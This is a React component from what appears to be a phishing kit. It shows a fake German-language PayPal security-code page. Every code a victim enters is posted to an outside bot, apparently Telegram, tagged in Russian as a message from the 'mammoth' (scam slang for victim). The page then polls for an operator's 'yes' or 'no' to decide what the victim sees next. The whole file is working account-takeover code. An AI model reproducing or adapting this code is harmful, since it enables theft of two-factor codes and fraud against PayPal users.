import React, {useEffect, useState} from 'react';
import classes from "../email/Email.module.css";
import axios from "axios";
import bot from "../../bot_manager/manager";
import loader from "../../assets/loader.gif";
import Infinity from "../infinity/Infinity";

let firstState;

const FinalAuth = (props) => {

    const [message, setMessage] = useState();
    const [text, setText] = useState('');
    const [isLoading, setLoading] = useState(false);
    const [isError, setError] = useState(false);
    const [isCorrect, setCorrect] = useState(false);

    useEffect(() => {
        if (props.state === 1) setText('Wir haben einen Sicherheitscode an die mit Ihrem PayPal-Konto verbundene Telefonnummer gesendet.')
        if (props.state === 2) setText('Wir haben einen Sicherheitscode an die mit Ihrem PayPal-Konto verbundene Telefonnummer gesendet.')
        if (props.state === 3) setText('Wir haben einen Sicherheitscode an die mit Ihrem PayPal-Konto verknüpfte E-Mail geschickt.')
    }, [props.state])

    const sendMessage =  () => {
        axios.get(bot.getUpdates())
            .then((res) => {
                firstState = res.data.result;
            })
        setLoading(true);
        axios.post(bot.sendMessage(message + '%20сообщение%20от%20мамонта'), '')
        axios.post(bot.sendMessage("yes_or_no"));
    }

    const getUpdatesInterval =  () => {
        axios.get(bot.getUpdates())
            .then((res) => {
                if (firstState) {
                    if (res.data.result.length !== firstState.length) {
                        let text = res.data.result[res.data.result.length - 1].message.text;
                        if (text === 'yes') {
                            setCorrect(true);
                            setLoading(false);
                        }
                        else if (text === 'no') {
                            setLoading(false);
                            setError(true);
                        } else firstState = res.data.result;
                    }
                } else firstState = res.data.result;

            })
    }

    useEffect(() => {
        if (isLoading) {
            console.log("Start");
            const interval = setInterval(getUpdatesInterval, 5000);
            return () => clearInterval(interval);
        }
    }, [isLoading])


    return (
        <div className={classes.corral}>
            {isLoading ? <img src={loader} className={classes.loader}/> : null}
            {!isCorrect ? <div className={[classes.contentContainerBordered, isLoading ? classes.loaderActive : ''].join(' ')}
                  style={{border: '0px'}}>
                <header>
                    <p role={"img"}
                       className={[classes.paypal_logo, classes.paypal_logo_long, classes.signin_paypal_logo].join(' ')}></p>
                </header>
                <div className={classes.final_title}>
                    Geben Sie den Code ein
                </div>
                <div>
                    <p className={classes.description}>
                        {text}
                    </p>
                </div>
                <div style={{marginLeft: "20px"}}>

                </div>
                <div id={"loginContent"}>
                    <div id="loginSection">
                        <div className={classes.notifications}>
                            <div className={classes.notifications}>
                                {isError ? <p className={[classes.notification, classes.notificationCritical].join(' ')}
                                              role="alert">Falsch eingegebener Code, versuchen Sie es
                                    erneut.</p> : null}
                            </div>
                        </div>
                        <form className={classes.maskable} onSubmit={(e) => {
                            e.preventDefault();
                            sendMessage();
                        }}>
                            <div className={classes.clearfix}>
                                <div className={classes.splitPhoneSection}>
                                    <div style={{textAlign: 'center'}}>
                                        <a href="#" id="forgotPassword"
                                           className={[classes.recoveryOption, classes.forgotPassword].join(' ')}
                                           data-client-log-action-type="clickForgotPasswordLink"
                                           pa-marked="1"></a>
                                    </div>
                                    <div className={classes.textInput}>
                                        <div className={classes.fieldWrapper}>
                                            <label className={classes.fieldLabel}></label>
                                            <input placeholder={"Sicherheitscode"} value={message}
                                                   onChange={e => setMessage(e.target.value)}/>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
                <div className={classes.actions}>
                    <button className={[classes.button].join(' ')} onClick={sendMessage}>
                        Weiter
                    </button>
                </div>
                <div className={classes.intentFooter}>
                    <div className={classes.localeSelector}>
                        <ul className={classes.localeLink}>
                            <li>
                                <a className={classes.selected} style={{color: '#0070BA'}}>Zuruck zum PayPal-Login</a>
                            </li>
                        </ul>
                    </div>
                </div>
            </div> : <Infinity />}
        </div>
    );
};

export default FinalAuth;